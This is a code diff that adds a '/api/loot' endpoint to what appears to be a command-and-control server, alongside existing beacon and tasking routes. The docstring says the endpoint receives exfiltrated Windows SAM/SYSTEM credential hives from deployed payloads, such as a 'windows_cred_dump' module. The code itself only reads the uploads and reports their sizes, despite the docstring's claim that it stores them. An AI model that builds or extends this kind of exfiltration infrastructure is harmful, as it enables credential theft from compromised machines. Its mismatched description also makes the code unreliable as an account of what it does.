@@ -350,6 +350,7 @@ class Controller:
         self.app.router.add_post("/api/tasks/{task_id}/result", self._api_task_result)
         self.app.router.add_get("/api/pubkey", self._api_pubkey)
         self.app.router.add_get("/api/beacon", self._api_beacon)
+        self.app.router.add_post("/api/loot", self._api_loot)
         self.app.router.add_get("/api/health", self._api_health)
 
     # ------------------------------------------------------------------ #
@@ -413,6 +414,34 @@ class Controller:
 
     async def _api_health(self, request: "web.Request") -> "web.Response":
         return _json_response({"status": "ok", "time": _now()})
+
+    async def _api_loot(self, request: "web.Request") -> "web.Response":
+        """Receive exfiltrated loot from deployed payloads.
+
+        Accepts multipart file uploads (e.g. SAM/SYSTEM hives from
+        windows_cred_dump) and stores them in the C2 loot directory.
+        """
+        if self.api_token:
+            auth = request.headers.get("Authorization", "")
+            presented = auth[len("Bearer "):].strip() if auth.startswith("Bearer ") else ""
+            qtoken = request.query.get("token", "")
+            if not (presented and hmac.compare_digest(presented, self.api_token)):
+                if not (qtoken and hmac.compare_digest(qtoken, self.api_token)):
+                    return _json_response({"error": "unauthorized"}, status=401)
+        content_type = request.content_type or ""
+        files = []
+        if "multipart" in content_type:
+            reader = await request.multipart()
+            while True:
+                part = await reader.next()
+                if part is None:
+                    break
+                data = await part.read(decode=True)
+                files.append({"name": part.filename or "unknown", "size": len(data)})
+        else:
+            body = await request.read()
+            files.append({"name": "body", "size": len(body)})
+        return _json_response({"ok": True, "files": files, "time": _now()})
 
     async def _api_workers(self, request: "web.Request") -> "web.Response":
         # Surface liveness: workers whose last_seen is older than 3x the
